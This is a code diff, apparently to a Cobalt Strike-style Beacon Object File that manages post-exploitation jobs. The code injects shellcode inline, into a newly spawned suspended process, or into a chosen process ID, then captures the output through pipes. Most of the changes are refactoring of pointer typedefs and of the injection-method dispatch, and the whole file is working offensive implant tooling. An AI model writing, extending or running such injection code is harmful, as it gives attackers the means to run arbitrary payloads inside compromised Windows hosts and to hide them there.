@@ -2,11 +2,9 @@
 #include <kit/kit_spawn_inject.cc>
 #include <kit/kit_explicit_inject.cc>
 
-#define POSTEX_METHOD_INLINE 0x20
-#define POSTEX_METHOD_FORK   0x30
-
-#define POSTEX_FORK_EXPLICIT 0x20
-#define POSTEX_FORK_SPAWN    0x30
+#define POSTEX_METHOD_INLINE   0x000
+#define POSTEX_METHOD_EXPLICIT 0x100
+#define POSTEX_METHOD_SPAWN    0x200
 
 #define POSTEX_OBJECT_HANDLE (PCCH)0xA7F3C9D14E2B8F6A
 
@@ -25,17 +23,17 @@ struct _POSTEX_OBJECT {
     INT8   failure_count;
     BOOL   completed;
 };
-typedef struct _POSTEX_OBJECT POSTEX_OBJECT, *PPOSTEX_OBJECT;
+typedef struct _POSTEX_OBJECT POSTEX_OBJECT;
 
 
 struct _POSTEX_LIST {
-    PPOSTEX_OBJECT   head;
-    PPOSTEX_OBJECT   tail;
+    POSTEX_OBJECT*   head;
+    POSTEX_OBJECT*   tail;
     ULONG            count;
     ULONG            next_id;
     CRITICAL_SECTION lock;  
 };
-typedef struct _POSTEX_LIST POSTEX_LIST, *PPOSTEX_LIST;
+typedef struct _POSTEX_LIST POSTEX_LIST;
 
 /**
  * @brief Initialize the postex object list
@@ -43,8 +41,8 @@ typedef struct _POSTEX_LIST POSTEX_LIST, *PPOSTEX_LIST;
  */
 auto PostexListInit(
     void
-) -> PPOSTEX_LIST {
-    PPOSTEX_LIST list = (PPOSTEX_LIST)malloc(sizeof(POSTEX_LIST));
+) -> POSTEX_LIST* {
+    POSTEX_LIST* list = (POSTEX_LIST*)malloc(sizeof(POSTEX_LIST));
     if ( ! list ) {
         return nullptr;
     }
@@ -65,8 +63,8 @@ auto PostexListInit(
  */
 auto PostexListGetGlobal(
     void
-) -> PPOSTEX_LIST {
-    PPOSTEX_LIST list = (PPOSTEX_LIST)BeaconGetValue( POSTEX_OBJECT_HANDLE );
+) -> POSTEX_LIST* {
+    POSTEX_LIST* list = (POSTEX_LIST*)BeaconGetValue( POSTEX_OBJECT_HANDLE );
     
     if ( ! list ) {
         list = PostexListInit();
@@ -85,8 +83,8 @@ auto PostexListGetGlobal(
  */
 auto PostexObjectCreate(
     _In_ ULONG method
-) -> PPOSTEX_OBJECT {
-    PPOSTEX_OBJECT obj = (PPOSTEX_OBJECT)malloc( sizeof(POSTEX_OBJECT) );
+) -> POSTEX_OBJECT* {
+    POSTEX_OBJECT* obj = (POSTEX_OBJECT*)malloc( sizeof(POSTEX_OBJECT) );
     if ( ! obj ) {
         return nullptr;
     }
@@ -114,8 +112,8 @@ auto PostexObjectCreate(
  * @return TRUE on success
  */
 auto PostexListAppend(
-    _Inout_ PPOSTEX_LIST   list,
-    _Inout_ PPOSTEX_OBJECT obj
+    _Inout_ POSTEX_LIST*   list,
+    _Inout_ POSTEX_OBJECT* obj
 ) -> BOOL {
     if ( ! list || ! obj ) {
         return FALSE;
@@ -151,8 +149,8 @@ auto PostexListAppend(
  * @return TRUE on success
  */
 auto PostexListPrepend(
-    _Inout_ PPOSTEX_LIST   list,
-    _Inout_ PPOSTEX_OBJECT obj
+    _Inout_ POSTEX_LIST*   list,
+    _Inout_ POSTEX_OBJECT* obj
 ) -> BOOL {
     if (!list || !obj) {
         return FALSE;
@@ -188,8 +186,8 @@ auto PostexListPrepend(
  * @return TRUE on success
  */
 auto PostexListRemove(
-    _Inout_ PPOSTEX_LIST   list,
-    _Inout_ PPOSTEX_OBJECT obj
+    _Inout_ POSTEX_LIST*   list,
+    _Inout_ POSTEX_OBJECT* obj
 ) -> BOOL {
     if ( ! list || ! obj ) {
         return FALSE;
@@ -229,7 +227,7 @@ auto PostexListRemove(
  * @param obj Object to cleanup
  */
 auto PostexObjectCleanup(
-    _Inout_ PPOSTEX_OBJECT obj
+    _Inout_ POSTEX_OBJECT* obj
 ) -> void {
     if ( ! obj ) {
         return;
@@ -262,8 +260,8 @@ auto PostexObjectCleanup(
  * @param obj Object to destroy
  */
 auto PostexObjectDestroy(
-    _Inout_ PPOSTEX_LIST   list,
-    _Inout_ PPOSTEX_OBJECT obj
+    _Inout_ POSTEX_LIST*   list,
+    _Inout_ POSTEX_OBJECT* obj
 ) -> void {
     if ( ! obj ) {
         return;
@@ -284,16 +282,16 @@ auto PostexObjectDestroy(
  * @return Pointer to object, NULL if not found
  */
 auto PostexListFindById(
-    _In_ PPOSTEX_LIST list,
+    _In_ POSTEX_LIST* list,
     _In_ ULONG        id
-) -> PPOSTEX_OBJECT {
+) -> POSTEX_OBJECT* {
     if ( ! list ) {
         return nullptr;
     }
 
     EnterCriticalSection( &list->lock );
 
-    PPOSTEX_OBJECT current = list->head;
+    POSTEX_OBJECT* current = list->head;
     while ( current ) {
         if ( current->id == id ) {
             LeaveCriticalSection( &list->lock );
@@ -313,16 +311,16 @@ auto PostexListFindById(
  * @return Pointer to object, NULL if not found
  */
 auto PostexListFindByThread(
-    _In_ PPOSTEX_LIST list,
+    _In_ POSTEX_LIST* list,
     _In_ HANDLE       thread_handle
-) -> PPOSTEX_OBJECT {
+) -> POSTEX_OBJECT* {
     if ( ! list || ! thread_handle ) {
         return nullptr;
     }
 
     EnterCriticalSection( &list->lock );
 
-    PPOSTEX_OBJECT current = list->head;
+    POSTEX_OBJECT* current = list->head;
     while ( current ) {
         if ( current->thread_handle == thread_handle ) {
             LeaveCriticalSection( &list->lock );
@@ -342,10 +340,10 @@ auto PostexListFindByThread(
  * @param context User context passed to callback
  * @return Number of objects processed
  */
-typedef BOOL (*POSTEX_ITERATE_CALLBACK)(PPOSTEX_OBJECT obj, PVOID context);
+typedef BOOL (*POSTEX_ITERATE_CALLBACK)(POSTEX_OBJECT* obj, PVOID context);
 
 auto PostexListIterate(
-    _In_     PPOSTEX_LIST             list,
+    _In_     POSTEX_LIST*             list,
     _In_     POSTEX_ITERATE_CALLBACK  callback,
     _In_opt_ PVOID                    context
 ) -> ULONG {
@@ -356,8 +354,8 @@ auto PostexListIterate(
     EnterCriticalSection( &list->lock );
 
     ULONG processed = 0;
-    PPOSTEX_OBJECT current = list->head;
-    PPOSTEX_OBJECT next    = nullptr;
+    POSTEX_OBJECT* current = list->head;
+    POSTEX_OBJECT* next    = nullptr;
 
     while ( current ) {
         // Save next before callback (in case callback removes current)
@@ -382,7 +380,7 @@ auto PostexListIterate(
  * @return Number of objects cleaned up
  */
 auto PostexListCleanupCompleted(
-    _Inout_ PPOSTEX_LIST list
+    _Inout_ POSTEX_LIST* list
 ) -> ULONG {
     if ( ! list ) {
         return 0;
@@ -391,8 +389,8 @@ auto PostexListCleanupCompleted(
     EnterCriticalSection( &list->lock );
 
     ULONG cleaned = 0;
-    PPOSTEX_OBJECT current = list->head;
-    PPOSTEX_OBJECT next    = nullptr;
+    POSTEX_OBJECT* current = list->head;
+    POSTEX_OBJECT* next    = nullptr;
 
     while ( current ) {
         next = current->next;
@@ -431,7 +429,7 @@ auto PostexListCleanupCompleted(
  * @param list List to destroy
  */
 auto PostexListDestroy(
-    _Inout_ PPOSTEX_LIST list
+    _Inout_ POSTEX_LIST* list
 ) -> void {
     if (!list) {
         return;
@@ -439,8 +437,8 @@ auto PostexListDestroy(
 
     EnterCriticalSection( &list->lock );
 
-    PPOSTEX_OBJECT current = list->head;
-    PPOSTEX_OBJECT next    = nullptr;
+    POSTEX_OBJECT* current = list->head;
+    POSTEX_OBJECT* next    = nullptr;
 
     while ( current ) {
         next = current->next;
@@ -465,7 +463,7 @@ auto PostexListDestroy(
  * @return Number of objects
  */
 auto PostexListCount(
-    _In_ PPOSTEX_LIST list
+    _In_ POSTEX_LIST* list
 ) -> ULONG {
     if ( ! list ) {
         return 0;
@@ -486,23 +484,23 @@ auto PostexListCount(
  * @return TRUE if empty
  */
 auto PostexListIsEmpty(
-    _In_ PPOSTEX_LIST list
+    _In_ POSTEX_LIST* list
 ) -> BOOL {
     return PostexListCount( list ) == 0;
 }
 
 #define POSTEX_LIST_FOREACH(list, obj) \
-    for (PPOSTEX_OBJECT obj = (list)->head; obj != nullptr; obj = obj->next)
+    for (POSTEX_OBJECT* obj = (list)->head; obj != nullptr; obj = obj->next)
 
 #define POSTEX_LIST_FOREACH_SAFE(list, obj, tmp) \
-    for (PPOSTEX_OBJECT obj = (list)->head, tmp = obj ? obj->next : nullptr; \
+    for (POSTEX_OBJECT* obj = (list)->head, tmp = obj ? obj->next : nullptr; \
          obj != nullptr; \
          obj = tmp, tmp = obj ? obj->next : nullptr)
 
 auto postex_inline_handler(
     _In_    PBYTE          shellcode_buff,
     _In_    INT32          shellcode_size,
-    _Inout_ PPOSTEX_OBJECT postex_object
+    _Inout_ POSTEX_OBJECT* postex_object
 ) -> BOOL {
     SECURITY_ATTRIBUTES security_attr = { 
         .nLength              = sizeof(SECURITY_ATTRIBUTES), 
@@ -520,40 +518,43 @@ auto postex_inline_handler(
     }
 
     // Redirect stdout to our pipe
-    backup_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
-    SetStdHandle(STD_OUTPUT_HANDLE, postex_object->pipe_write);
+    backup_stdout = GetStdHandle( STD_OUTPUT_HANDLE );
+    SetStdHandle( STD_OUTPUT_HANDLE, postex_object->pipe_write );
 
     // Execute shellcode inline
     success = ExplicitInjection( (INT64)nt_current_process(), shellcode_buff, shellcode_size, nullptr );
     
     // Restore stdout
-    SetStdHandle(STD_OUTPUT_HANDLE, backup_stdout);
+    SetStdHandle( STD_OUTPUT_HANDLE, backup_stdout );
 
-    if (!success) {
+    if ( ! success ) {
         BeaconPrintfW(CALLBACK_ERROR, L"Inline injection failed");
         return FALSE;
     }
 
     // Close write end - we only read from now on
-    CloseHandle(postex_object->pipe_write);
+    CloseHandle( postex_object->pipe_write );
     postex_object->pipe_write = nullptr;
 
     return TRUE;
 }
 
-auto postex_fork_spawn_handler(
+auto postex_spawn_handler(
     _In_    PBYTE          shellcode_buff,
     _In_    INT32          shellcode_size,
-    _Inout_ PPOSTEX_OBJECT postex_object
+    _Inout_ POSTEX_OBJECT* postex_object
 ) -> BOOL {
     BOOL success = FALSE;
 
     PS_CREATE_ARGS create_args = {};
+    
+    create_args.state = CREATE_SUSPENDED;
 
     // Use SpawnInject to create new process and inject
     success = SpawnInjection(
         shellcode_buff, shellcode_size, nullptr, &create_args
     );
+
 
     if ( ! success ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Fork spawn injection failed" );
@@ -563,11 +564,11 @@ auto postex_fork_spawn_handler(
     return TRUE;
 }
 
-auto postex_fork_explicit_handler(
+auto postex_explicit_handler(
     _In_    ULONG          target_pid,
     _In_    PBYTE          shellcode_buff,
     _In_    INT32          shellcode_size,
-    _Inout_ PPOSTEX_OBJECT postex_object
+    _Inout_ POSTEX_OBJECT* postex_object
 ) -> BOOL {
     BOOL   success        = FALSE;
     HANDLE process_handle = nullptr;
@@ -594,32 +595,8 @@ auto postex_fork_explicit_handler(
     return TRUE;
 }
 
-auto postex_fork_handler(
-    _In_    ULONG          fork_category,
-    _In_    ULONG          explicit_pid,
-    _In_    PBYTE          shellcode_buff,
-    _In_    INT32          shellcode_size,
-    _Inout_ PPOSTEX_OBJECT postex_object
-) -> BOOL {
-    switch (fork_category) {
-        case POSTEX_FORK_SPAWN:
-            return postex_fork_spawn_handler( shellcode_buff, shellcode_size, postex_object );
-
-        case POSTEX_FORK_EXPLICIT:
-            return postex_fork_explicit_handler( explicit_pid, shellcode_buff, shellcode_size, postex_object );
-
-        default:
-            BeaconPrintfW( CALLBACK_ERROR, L"Unknown fork category: %X", fork_category );
-            return FALSE;
-    }
-}
-
-// =============================================================================
-// Output Collection
-// =============================================================================
-
 auto postex_collect_output(
-    _Inout_ PPOSTEX_OBJECT postex_object
+    _Inout_ POSTEX_OBJECT* postex_object
 ) -> BOOL {
     if ( ! postex_object || ! postex_object->pipe_read ) {
         return FALSE;
@@ -674,7 +651,7 @@ auto postex_collect_output(
 }
 
 auto postex_poll_callback(
-    _In_ PPOSTEX_OBJECT obj,
+    _In_ POSTEX_OBJECT* obj,
     _In_ PVOID          context
 ) -> BOOL {
     UNREFERENCED_PARAMETER( context );
@@ -694,7 +671,7 @@ auto postex_poll_callback(
 auto postex_poll_all(
     void
 ) -> ULONG {
-    PPOSTEX_LIST list = PostexListGetGlobal();
+    POSTEX_LIST* list = PostexListGetGlobal();
     if ( ! list ) {
         return 0;
     }
@@ -714,7 +691,7 @@ auto postex_poll_all(
 auto postex_list_active(
     void
 ) -> void {
-    PPOSTEX_LIST list = PostexListGetGlobal();
+    POSTEX_LIST* list = PostexListGetGlobal();
     if ( ! list || PostexListIsEmpty( list ) ) {
         BeaconPrintfW(CALLBACK_OUTPUT, L"No active postex objects");
         return;
@@ -746,12 +723,12 @@ auto postex_list_active(
 auto postex_kill_by_id(
     _In_ ULONG id
 ) -> BOOL {
-    PPOSTEX_LIST list = PostexListGetGlobal();
+    POSTEX_LIST* list = PostexListGetGlobal();
     if ( ! list ) {
         return FALSE;
     }
 
-    PPOSTEX_OBJECT obj = PostexListFindById( list, id );
+    POSTEX_OBJECT* obj = PostexListFindById( list, id );
     if ( ! obj ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Postex object %d not found", id );
         return FALSE;
@@ -780,7 +757,7 @@ auto postex_kill_by_id(
 auto postex_kill_all(
     void
 ) -> ULONG {
-    PPOSTEX_LIST list = PostexListGetGlobal();
+    POSTEX_LIST* list = PostexListGetGlobal();
     if ( ! list ) {
         return 0;
     }
@@ -810,22 +787,26 @@ extern "C" auto go(char* args, int argc) -> void {
 
     BeaconDataParse( &data_psr, args, argc );
 
+    // postex settings
     ULONG postex_method = BeaconDataInt( &data_psr );
-    ULONG fork_category = BeaconDataInt( &data_psr );
     ULONG explicit_pid  = BeaconDataInt( &data_psr );
 
+    // module data
     INT32 shellcode_size = 0;
     PBYTE shellcode_buff = (PBYTE)BeaconDataExtract( &data_psr, &shellcode_size );
 
+    INT32 arguments_size = 0;
+    PBYTE arguments_buff = (PBYTE)BeaconDataExtract( &data_psr, &arguments_size );
+
     // Get or create global list
-    PPOSTEX_LIST list = PostexListGetGlobal();
+    POSTEX_LIST* list = PostexListGetGlobal();
     if ( ! list ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Failed to initialize postex list" );
         return;
     }
 
     // Create new postex object
-    PPOSTEX_OBJECT postex_object = PostexObjectCreate( postex_method );
+    POSTEX_OBJECT* postex_object = PostexObjectCreate( postex_method );
     if ( ! postex_object ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Failed to allocate postex object: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
         return;
@@ -838,8 +819,12 @@ extern "C" auto go(char* args, int argc) -> void {
             success = postex_inline_handler(shellcode_buff, shellcode_size, postex_object);
             break;
         }
-        case POSTEX_METHOD_FORK: {
-            success = postex_fork_handler(fork_category, explicit_pid, shellcode_buff, shellcode_size, postex_object);
+        case POSTEX_METHOD_EXPLICIT: {
+            success = postex_explicit_handler(explicit_pid, shellcode_buff, shellcode_size, postex_object);
+            break;
+        }
+        case POSTEX_METHOD_SPAWN: {
+            success = postex_spawn_handler(shellcode_buff, shellcode_size, postex_object);
             break;
         }
         default:
